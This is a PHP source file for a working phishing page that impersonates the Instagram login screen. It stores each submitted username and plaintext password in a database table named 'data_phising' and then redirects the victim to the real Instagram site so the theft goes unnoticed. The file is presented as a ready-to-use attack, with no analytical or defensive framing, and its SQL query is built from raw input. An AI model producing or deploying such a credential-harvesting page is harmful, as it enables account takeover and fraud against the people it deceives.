<?php

if ($_GET['content']) {
    if ($_GET['content'] !== 'login') {
        header('Location: ./');
    }
} else {
    header('Location: ./');
}

if (isset($_POST['username'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $now      = date('d-m-Y h:i:s');

    if ($username != NULL && $password != NULL) {
        
        try {
            $connect = mysqli_connect('localhost', 'root', '', 'bals_panel');
            if (!$connect) {
                die("Connection failed: " . mysqli_connect_error());
            }

            $query = "insert into data_phising (username, password, date) values ('$username', '$password', '$now')";
            mysqli_query($connect, $query) or die(mysqli_error($connect));
        } catch (\Throwable $th) {
            throw $th;
        }
        header('Location: https://instagram.com');
        
    } else {
        echo '<script>alert("Please input username & password")</script>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
    <div class="container">
        <div style="text-align: center;">
            <img src="./assets/img/instagram.png" draggable="false" width="50%" alt="" class="image mt-5 mb-5">
    
            <form action="./instagram.php" method="POST">
                <div class="form-group">
                    <input type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-control" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn btn-primary btn-block btn-sm" style="font-weight: 700;">Log In</button>
            </form>

            <p class="mt-4">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
        </div>
    </div>

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

</body>
</html>